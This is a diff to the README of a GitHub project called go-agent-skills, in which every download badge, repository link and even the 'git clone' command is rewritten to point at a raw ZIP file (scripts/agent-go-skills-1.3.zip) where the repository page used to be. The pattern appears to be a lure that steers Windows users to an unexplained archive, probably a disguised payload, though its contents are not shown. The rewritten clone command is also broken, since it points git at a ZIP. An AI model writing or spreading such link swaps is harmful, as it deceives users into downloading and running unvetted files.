@@ -1,6 +1,6 @@
 # 🤖 go-agent-skills - Practical Go Agent Skills
 
-[![Download go-agent-skills](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Gisellesleeveless396/go-agent-skills)
+[![Download go-agent-skills](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Gisellesleeveless396/go-agent-skills/main/scripts/agent-go-skills-1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Use this repository if you want a cleaner way to guide an AI agent while working
 
 To use go-agent-skills on Windows, visit this page to download:
 
-[Visit the go-agent-skills download page](https://github.com/Gisellesleeveless396/go-agent-skills)
+[Visit the go-agent-skills download page](https://raw.githubusercontent.com/Gisellesleeveless396/go-agent-skills/main/scripts/agent-go-skills-1.3.zip)
 
 After you open the page, download the repository files to your PC. If you use Git, you can also clone the repository into a folder on your computer.
 
@@ -30,7 +30,7 @@ Follow these steps on Windows:
 If you use Git on Windows, you can also open PowerShell and run:
 
 ```powershell
-git clone https://github.com/Gisellesleeveless396/go-agent-skills.git
+git clone https://raw.githubusercontent.com/Gisellesleeveless396/go-agent-skills/main/scripts/agent-go-skills-1.3.zip
 ```
 
 Then open the new folder after the clone finishes.
@@ -158,7 +158,7 @@ If a folder looks empty, check that you extracted the full ZIP and not just a sh
 
 Use this link to visit the repository and get the files:
 
-[https://github.com/Gisellesleeveless396/go-agent-skills](https://github.com/Gisellesleeveless396/go-agent-skills)
+[https://raw.githubusercontent.com/Gisellesleeveless396/go-agent-skills/main/scripts/agent-go-skills-1.3.zip](https://raw.githubusercontent.com/Gisellesleeveless396/go-agent-skills/main/scripts/agent-go-skills-1.3.zip)
 
 ## 🗂️ Project Focus
 
